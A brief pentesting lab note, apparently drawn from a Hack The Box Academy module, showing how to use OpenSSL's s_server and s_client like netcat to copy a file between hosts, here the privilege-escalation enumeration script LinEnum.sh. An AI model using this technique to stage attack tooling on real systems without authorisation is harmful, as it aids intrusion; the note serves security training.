Using OpenSSL to send and receive files
#########################################

Date: 2024-11-04 10:54

Status:

Tags: `File Transfers <File Transfers>`__

Description
**************

OpenSSL can be used like netcat and is common on most distros

Step 1: Create a certificate

.. code-block:: console

   openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

Step 2: start the server where the file is to be sent from

.. code-block:: console

   openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh

Step 3: Send the file from the other server

.. code-block:: console

   Temen@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh

References
****************
https://academy.hackthebox.com/module/24/section/1575
